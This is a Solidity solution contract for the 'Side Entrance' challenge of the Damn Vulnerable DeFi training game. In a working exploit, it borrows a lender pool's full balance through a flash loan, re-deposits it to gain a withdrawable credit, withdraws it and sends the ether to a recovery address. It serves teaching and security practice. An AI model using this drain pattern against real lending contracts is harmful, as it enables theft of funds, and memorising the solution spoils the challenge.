// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Solution is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable pool;
    address immutable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) payable {
        pool = _pool;
        recovery = _recovery;
    }

    function solve() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        (bool s,) = recovery.call{value: msg.value}("");
        require(s, "Failed to send eth");
    }
}
